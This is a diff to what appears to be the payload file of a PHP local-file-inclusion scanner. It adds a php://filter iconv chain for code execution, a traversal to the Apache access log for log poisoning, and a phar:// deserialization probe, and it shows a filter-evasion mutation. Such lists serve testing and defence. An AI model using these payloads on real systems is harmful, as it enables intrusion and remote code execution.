@@ -35,6 +35,18 @@ payloads:
     template: 'data://text/plain;base64,e2NhbmFyeX0='
     confidence: suspected
     notes: data:// wrapper; tests includer that follows arbitrary schemes.
+  - id: php_filter_chain_rce
+    template: 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode/resource=php://temp'
+    confidence: suspected
+    notes: Synacktiv iconv filter-chain primitive; forges arbitrary PHP in-memory from a bare php://filter read, no upload or writable path required.
+  - id: log_poison_access_log
+    template: '../../../../var/log/apache2/access.log'
+    confidence: suspected
+    notes: Log-inclusion target for log-poisoning chains; verify the log is readable before pairing with a User-Agent/URL injection step.
+  - id: phar_wrapper_marker
+    template: 'phar://{canary}.jpg/marker'
+    confidence: suspected
+    notes: phar:// metadata deserialization probe against an uploaded polyglot; include triggers object-injection gadget without a bare unserialize() call.
 mutations:
   - name: case_flip
     description: Mixed-case scheme/file names defeat lowercase-only filters.
